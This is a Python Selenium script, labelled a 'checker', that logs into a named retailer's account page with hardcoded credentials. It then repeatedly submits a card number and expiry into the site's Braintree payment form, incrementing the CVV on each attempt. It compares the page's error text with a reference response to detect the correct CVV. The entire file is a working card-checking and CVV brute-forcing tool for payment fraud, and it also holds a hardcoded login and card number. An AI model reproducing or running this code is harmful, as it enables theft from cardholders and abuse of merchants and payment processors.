from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
print("checker made by Ata najar")
ccnum = input("enter card number : ")
ccexp = input("enter card expration date : ")
cvv = int(input("enter cvv intial: "))
i = "decline"
path = ".\chromedriver.exe"
driver = webdriver.Chrome(path)
driver.get("https://legionathletics.com/my-account/add-payment-method/")
driver.find_element_by_xpath('//*[@id="checkout-login-button"]').click()
driver.find_element_by_xpath('//*[@id="account-modals"]/div/div/div/div/form/input[1]').send_keys("obyda3@gmail.com")
driver.find_element_by_xpath('//*[@id="account-modals"]/div/div/div/div/form/input[2]').send_keys("Pa$$w0rd!")
driver.find_element_by_xpath('//*[@id="account-modals"]/div/div/div/div/form/button').click()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-number']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='number' and @id='credit-card-number']"))).send_keys("5410510000656745")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-expirationDate']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='expirationDate' and @id='expiration']"))).send_keys("08/22")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-cvv']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='cvv' and @id='cvv']"))).send_keys("038")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-postalCode']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='postalCode' and @id='postal-code']"))).send_keys("10002")
driver.switch_to.default_content()
driver.find_element_by_xpath('//*[@id="place_order"]').click()
driver.switch_to.default_content()
obyda = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CLASS_NAME, "woocommerce-error")))
incorrect = obyda.text
time.sleep(20)
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-number']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='number' and @id='credit-card-number']"))).send_keys("5410510000656745")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-expirationDate']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='expirationDate' and @id='expiration']"))).send_keys("08/22")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-cvv']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='cvv' and @id='cvv']"))).send_keys("409")
driver.switch_to.default_content()
WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH,"//iframe[@id='braintree-hosted-field-postalCode']")))
WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//input[@class='postalCode' and @id='postal-code']"))).send_keys("10002")
driver.switch_to.default_content()
driver.find_element_by_xpath('//*[@id="place_order"]').click()
driver.switch_to.default_content()
time.sleep(20)
obydaa = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CLASS_NAME, "woocommerce-error")))
correct = obydaa.text

driver.switch_to.default_content()
time.sleep(20)
while '50' == '50':
    driver.switch_to.default_content()
    WebDriverWait(driver, 20).until(
        EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[@id='braintree-hosted-field-number']")))
    WebDriverWait(driver, 20).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@class='number' and @id='credit-card-number']"))).send_keys(
        ccnum)
    driver.switch_to.default_content()
    WebDriverWait(driver, 20).until(
        EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[@id='braintree-hosted-field-expirationDate']")))
    WebDriverWait(driver, 20).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@class='expirationDate' and @id='expiration']"))).send_keys(
        ccexp)
    driver.switch_to.default_content()
    m = str(cvv).zfill(3)
    WebDriverWait(driver, 20).until(
        EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[@id='braintree-hosted-field-cvv']")))
    WebDriverWait(driver, 20).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@class='cvv' and @id='cvv']"))).send_keys(m)
    driver.switch_to.default_content()
    WebDriverWait(driver, 20).until(
        EC.frame_to_be_available_and_switch_to_it((By.XPATH, "//iframe[@id='braintree-hosted-field-postalCode']")))
    WebDriverWait(driver, 20).until(
        EC.element_to_be_clickable((By.XPATH, "//input[@class='postalCode' and @id='postal-code']"))).send_keys("10002")
    driver.switch_to.default_content()
    driver.find_element_by_xpath('//*[@id="place_order"]').click()
    driver.switch_to.default_content()
    time.sleep(20)
    obydaaaa = WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.CLASS_NAME, "woocommerce-error")))
    mastercard = obydaaaa.text
    l = cvv
    cvv += 1
    if mastercard == correct:
        i = "successs - made by obyda al whedy"
        n = ccnum,"-",ccexp,"-",l,"-",i
        print(ccnum, "-", ccexp, "-", l, "-", i)
        break
    print(ccnum,"-",ccexp,"-",l,"-",i)
    time.sleep(20)
